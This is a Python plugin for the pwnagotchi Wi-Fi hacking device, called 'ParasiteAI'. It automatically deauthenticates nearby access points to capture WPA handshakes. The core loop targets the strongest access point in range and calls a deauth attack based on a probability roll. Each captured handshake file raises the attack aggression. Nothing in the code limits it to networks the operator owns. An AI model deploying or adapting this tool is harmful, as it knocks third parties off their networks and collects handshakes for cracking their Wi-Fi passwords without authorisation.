import os
import json
import time
import random
import logging
import threading
import datetime
from enum import Enum
from collections import deque
from pwnagotchi import plugins
from pwnagotchi.ui.components import LabeledValue
from pwnagotchi.ui.view import BLACK
import pwnagotchi.ui.fonts as fonts


# -------------------------
# Logging
# -------------------------

logger = logging.getLogger("ParasiteAI")


# -------------------------
# Constants
# -------------------------

MEMORY_FILE = "/root/parasite_ai.json"
LOGS_FILE = "/root/parasite_ai_logs.json"
HANDSHAKE_DIR = "/root/handshakes"

AGGRESSION_LEVELS = ["mellow", "balanced", "aggro"]

AGGRESSION_PROFILES = {
    "mellow": {"attack_prob": 0.3, "rest_success": 15, "rest_fail": 30},
    "balanced": {"attack_prob": 0.6, "rest_success": 8, "rest_fail": 15},
    "aggro": {"attack_prob": 0.9, "rest_success": 3, "rest_fail": 10},
}

MOODS = {
    "mellow": "Tired 😴",
    "balanced": "Focused 👀",
    "aggro": "Feeling confident 😈",
}


class State(Enum):
    QUIET = "quiet"
    SCANNING = "scanning"
    ATTACKING = "attacking"
    RESTING = "resting"


# -------------------------
# Plugin
# -------------------------


class ParasiteAI(plugins.Plugin):
    __author__ = "ParasiteAI"
    __version__ = "0.0.1"
    __license__ = "GPL3"
    __description__ = "Lightweight AI replacement with dynamic aggressiveness, channel bias, and decision reasoning"

    def __init__(self):
        self.state = State.QUIET
        self.aggression_index = 1  # balanced
        self.last_action = 0
        self.last_handshake_count = 0
        self.last_attack_result = None  # Track success/fail of last attack
        self.memory = {
            "success": 0,
            "fail": 0,
            "channels": {},
            "ap_history": {},  # Per-AP success tracking
        }
        self.memory_available = False
        self.handshake_dir_available = False
        # Configuration options
        self.min_rssi = -80  # Only target APs with RSSI > -80 dBm
        self.min_clients = 0  # Prefer APs with clients
        self.consecutive_fails = 0  # Track consecutive failures
        self.max_consecutive_fails = 3  # Give up after N fails
        # Performance optimizations for RPi Zero W2
        self.save_interval = 10  # Save memory every N captures (reduce I/O)
        self.saves_since_last_io = 0
        self.max_ap_history = 50  # Cap AP history to prevent memory bloat
        self.enable_debug_logs = False  # Reduce CPU from logging on weak hardware
        # File-based logging
        self._log_file_lock = threading.Lock()
        self._logs_available = True  # Track if logs directory is available

    # -------------------------
    # Lifecycle
    # -------------------------

    def on_loaded(self):
        self._log("INFO", "ParasiteAI loaded")
        self._check_availability()
        self._load_memory()
        self._load_config()
        self._update_handshake_count()

    def on_unload(self):
        self._log("INFO", "ParasiteAI unloading, saving memory")
        self._save_memory()

    def on_ui_setup(self, ui):
        ui.add_element(
            "mood",
            LabeledValue(
                color=BLACK,
                label="",
                value="--",
                position=(0, 10),
                label_font=fonts.Small,
                text_font=fonts.Small,
            ),
        )
        ui.add_element(
            "ai_state",
            LabeledValue(
                color=BLACK,
                label="",
                value="--",
                position=(0, 25),
                label_font=fonts.Small,
                text_font=fonts.Small,
            ),
        )
        ui.add_element(
            "ai_level",
            LabeledValue(
                color=BLACK,
                label="",
                value="--",
                position=(0, 40),
                label_font=fonts.Small,
                text_font=fonts.Small,
            ),
        )

    def on_ui_update(self, ui):
        ui.set("mood", MOODS[self.current_aggression()])
        ui.set("ai_state", self.state.value)
        ui.set("ai_level", self.current_aggression())

    def on_webhook(self, path, request):
        """Handle webhook requests for logs and status"""
        try:
            if path == "/logs":
                # Read logs from file
                try:
                    if os.path.exists(LOGS_FILE):
                        with open(LOGS_FILE, "r") as f:
                            logs = json.load(f)
                    else:
                        logs = []
                except Exception as e:
                    self._log("ERROR", f"Failed to read logs: {e}")
                    logs = []
                return {"logs": logs}
            elif path == "/status":
                return {
                    "state": self.state.value,
                    "mood": MOODS[self.current_aggression()],
                    "aggression": self.current_aggression(),
                    "success": self.memory["success"],
                    "fail": self.memory.get("fail", 0),
                    "consecutive_fails": self.consecutive_fails,
                }
        except Exception as e:
            self._log("ERROR", f"Webhook error: {e}")
            return {"error": str(e)}
        return {"error": "Unknown path"}

    # -------------------------
    # Logging
    # -------------------------

    def _log(self, level, message):
        """Log to both system logger and file"""
        # Log to system
        full_message = f"[ParasiteAI] {message}"
        if level == "ERROR":
            logging.error(full_message)
        elif level == "WARNING":
            logging.warning(full_message)
        elif level == "DEBUG":
            logging.debug(full_message)
        else:  # INFO
            logging.info(full_message)

        # Write to file
        if self._logs_available:
            self._write_log_to_file(level, message)

    def _write_log_to_file(self, level, message):
        """Append log entry to JSON file"""
        try:
            with self._log_file_lock:
                logs = []
                # Read existing logs if file exists
                if os.path.exists(LOGS_FILE):
                    try:
                        with open(LOGS_FILE, "r") as f:
                            logs = json.load(f)
                    except Exception as e:
                        logging.warning(f"[ParasiteAI] Failed to read logs file: {e}")
                        logs = []

                # Add new log entry
                logs.append(
                    {
                        "timestamp": datetime.datetime.now().strftime("%H:%M:%S"),
                        "level": level,
                        "message": message,
                    }
                )

                # Keep only last 100 logs to prevent file bloat
                if len(logs) > 100:
                    logs = logs[-100:]

                # Write back to file
                with open(LOGS_FILE, "w") as f:
                    json.dump(logs, f)
        except Exception as e:
            logging.warning(f"[ParasiteAI] Failed to write logs: {e}")
            self._logs_available = False

    # -------------------------
    # Configuration
    # -------------------------

    def _load_config(self):
        """Load configuration from plugin options"""
        if "min_rssi" in self.options:
            self.min_rssi = self.options["min_rssi"]
        if "min_clients" in self.options:
            self.min_clients = self.options["min_clients"]
        if "max_consecutive_fails" in self.options:
            self.max_consecutive_fails = self.options["max_consecutive_fails"]
        if "save_interval" in self.options:
            self.save_interval = self.options["save_interval"]
        if "enable_debug_logs" in self.options:
            self.enable_debug_logs = self.options["enable_debug_logs"]
        self._log(
            "INFO",
            f"Config loaded: min_rssi={self.min_rssi}, max_fails={self.max_consecutive_fails}, save_interval={self.save_interval}",
        )

    def _log_decision(self, attack, reason, extra=None):
        if not self.enable_debug_logs:
            return
        if extra:
            self._log(
                "DEBUG",
                f"Decision: attack={('yes' if attack else 'no')} reason={reason} ({extra})",
            )
        else:
            self._log(
                "DEBUG",
                f"Decision: attack={('yes' if attack else 'no')} reason={reason}",
            )

    # -------------------------
    # Core loop
    # -------------------------

    def on_wifi_update(self, agent, access_points):
        now = time.time()

        if now - self.last_action < 3:
            self._log_decision(False, "rate_limited")
            return

        if self._too_hot():
            self._log_decision(False, "thermal_limit")
            self._cooldown()
            return

        if self._battery_low(agent):
            self._log_decision(False, "low_battery")
            self._cooldown()
            return

        if self._new_handshake():
            self._log("INFO", f"Handshake captured! Total={self.memory['success']}")
            self._reward_success()
            self.consecutive_fails = 0  # Reset failure counter on success
            self._log_decision(False, "handshake_processed")
            # Batch save to reduce I/O on Zero W2
            self.saves_since_last_io += 1
            if self.saves_since_last_io >= self.save_interval:
                self._save_memory()
                self.saves_since_last_io = 0

        if not access_points:
            self.state = State.SCANNING
            self._log_decision(False, "no_access_points")
            return

        # Filter viable targets
        viable_aps = self._filter_aps(access_points)
        if not viable_aps:
            self.state = State.SCANNING
            self._log_decision(
                False, "no_viable_targets", f"total_aps={len(access_points)}"
            )
            return

        # Check if we've had too many consecutive failures
        if self.consecutive_fails >= self.max_consecutive_fails:
            self._log_decision(
                False, "too_many_failures", f"consecutive={self.consecutive_fails}"
            )
            self._cooldown()
            return

        prob = self.attack_probability()
        roll = random.random()

        if roll < prob:
            self._log_decision(
                True, "probability_roll", f"roll={roll:.2f} < prob={prob:.2f}"
            )
            self._attack(agent, viable_aps)
        else:
            self.state = State.SCANNING
            self._log_decision(
                False, "random_skip", f"roll={roll:.2f} >= prob={prob:.2f}"
            )

        self.last_action = now

    # -------------------------
    # Actions
    # -------------------------

    def _filter_aps(self, access_points):
        """Filter APs based on RSSI and other criteria - optimized for low-power devices"""
        viable = []
        min_rssi = self.min_rssi
        for ap in access_points:
            rssi = ap.get("rssi", -100)
            # Skip weak signals
            if rssi < min_rssi:
                continue
            viable.append(ap)
        # Quick sort by RSSI only (single key faster than multi-key)
        if viable:
            viable.sort(key=lambda ap: ap.get("rssi", -100), reverse=True)
        return viable

    def _attack(self, agent, aps):
        # Choose best target from filtered APs
        ap = aps[0]
        ap_bssid = ap.get("address", "unknown")
        detected_channel = ap.get("channel", 1)  # Avoid str conversion
        chosen_channel = self._choose_channel(detected_channel)

        logger.info(
            "Attacking AP %s rssi=%d",
            ap.get("hostname", "<unknown>"),
            ap.get("rssi", -100),
        )

        self.state = State.ATTACKING
        agent.set_channel(chosen_channel)
        agent.deauth(ap)

        # Cap AP history to prevent unbounded memory growth
        ap_hist = self.memory["ap_history"]
        if len(ap_hist) < self.max_ap_history:
            if ap_bssid not in ap_hist:
                ap_hist[ap_bssid] = 0
            ap_hist[ap_bssid] += 1
        self.last_attack_result = None  # Will be set by handshake detection
        time.sleep(self._get_rest_time(False))  # Default to failure rest
        self.state = State.RESTING

    def _cooldown(self):
        self._log("WARNING", "Entering cooldown, reducing aggression")
        self.state = State.RESTING
        self._decrease_aggression()

    # -------------------------
    # Aggression logic
    # -------------------------

    def current_aggression(self):
        return AGGRESSION_LEVELS[self.aggression_index]

    def attack_probability(self):
        return AGGRESSION_PROFILES[self.current_aggression()]["attack_prob"]

    def _get_rest_time(self, was_successful):
        """Get rest time based on attack success"""
        aggression = self.current_aggression()
        if was_successful:
            return AGGRESSION_PROFILES[aggression]["rest_success"]
        else:
            return AGGRESSION_PROFILES[aggression]["rest_fail"]

    def _reward_success(self):
        self.memory["success"] += 1
        self._increase_aggression()
        self.last_attack_result = True
        self.consecutive_fails = 0

    def _increase_aggression(self):
        if self.aggression_index < len(AGGRESSION_LEVELS) - 1:
            self.aggression_index += 1
            self._log("INFO", f"Aggression increased to {self.current_aggression()}")

    def _decrease_aggression(self):
        if self.aggression_index > 0:
            self.aggression_index -= 1
            self._log("INFO", f"Aggression decreased to {self.current_aggression()}")

    # -------------------------
    # Channel memory bias
    # -------------------------

    def _choose_channel(self, detected_channel):
        """Choose channel - optimized for low CPU"""
        channels = self.memory["channels"]

        # Try detected channel first (most likely to work)
        if detected_channel in channels and channels[detected_channel] > 0:
            if self.last_attack_result:
                channels[detected_channel] += 1
            return detected_channel

        # Otherwise use detected or increment
        if detected_channel not in channels:
            channels[detected_channel] = 1
        else:
            if self.last_attack_result:
                channels[detected_channel] += 1

        return detected_channel

    # -------------------------
    # Availability checks
    # -------------------------

    def _check_availability(self):
        """Check if memory file directory and handshake directory are available"""
        # Check memory file availability
        memory_dir = os.path.dirname(MEMORY_FILE)
        if os.path.isdir(memory_dir) and os.access(memory_dir, os.W_OK):
            self.memory_available = True
            self._log("INFO", f"Memory file directory is available: {memory_dir}")
        else:
            self.memory_available = False
            self._log(
                "WARNING",
                f"Memory file directory not available or not writable: {memory_dir}",
            )

        # Check handshake directory availability
        if os.path.isdir(HANDSHAKE_DIR) and os.access(HANDSHAKE_DIR, os.R_OK):
            self.handshake_dir_available = True
            self._log("INFO", f"Handshake directory is available: {HANDSHAKE_DIR}")
        else:
            self.handshake_dir_available = False
            self._log(
                "WARNING",
                f"Handshake directory not available or not readable: {HANDSHAKE_DIR}",
            )

    # -------------------------
    # Handshake detection
    # -------------------------

    def _update_handshake_count(self):
        if self.handshake_dir_available:
            try:
                self.last_handshake_count = len(os.listdir(HANDSHAKE_DIR))
            except Exception as e:
                self._log("WARNING", f"Failed to count handshakes: {e}")
                self.handshake_dir_available = False

    def _new_handshake(self):
        if not self.handshake_dir_available:
            return False

        try:
            current = len(os.listdir(HANDSHAKE_DIR))
            if current > self.last_handshake_count:
                self.last_handshake_count = current
                self.last_attack_result = True
                return True
            else:
                # No new handshake = failed attack
                self.consecutive_fails += 1
                self.last_attack_result = False
        except Exception as e:
            self._log("WARNING", f"Failed to check handshakes: {e}")
            self.handshake_dir_available = False
        return False

    # -------------------------
    # Safety
    # -------------------------

    def _too_hot(self):
        try:
            with open("/sys/class/thermal/thermal_zone0/temp") as f:
                temp = int(f.read()) / 1000
                if temp > 80:
                    self._log("WARNING", f"CPU temperature high: {temp:.1f}°C")
                    return True
        except Exception as e:
            self._log("WARNING", f"Thermal read failed: {e}")
        return False

    def _battery_low(self, agent):
        try:
            level = agent.battery()
            if level < 20:
                self._log("WARNING", f"Battery low: {level}%")
                return True
        except Exception as e:
            self._log("WARNING", f"Battery read failed: {e}")
        return False

    # -------------------------
    # Persistence
    # -------------------------

    def _load_memory(self):
        if not self.memory_available:
            self._log("INFO", "Memory file not available, using in-memory storage")
            return

        if os.path.exists(MEMORY_FILE):
            try:
                with open(MEMORY_FILE, "r") as f:
                    self.memory = json.load(f)
                self._log("INFO", f"Memory loaded: {self.memory}")
            except Exception as e:
                self._log("WARNING", f"Failed to load memory: {e}")
                self.memory_available = False
        else:
            self._log("INFO", "Memory file does not exist yet, will create on save")

    def _save_memory(self):
        if not self.memory_available:
            self._log("DEBUG", "Memory file not available, skipping save")
            return

        try:
            with open(MEMORY_FILE, "w") as f:
                json.dump(self.memory, f)
            self._log("DEBUG", "Memory saved successfully")
        except Exception as e:
            self._log("WARNING", f"Failed to save memory: {e}")
            self.memory_available = False
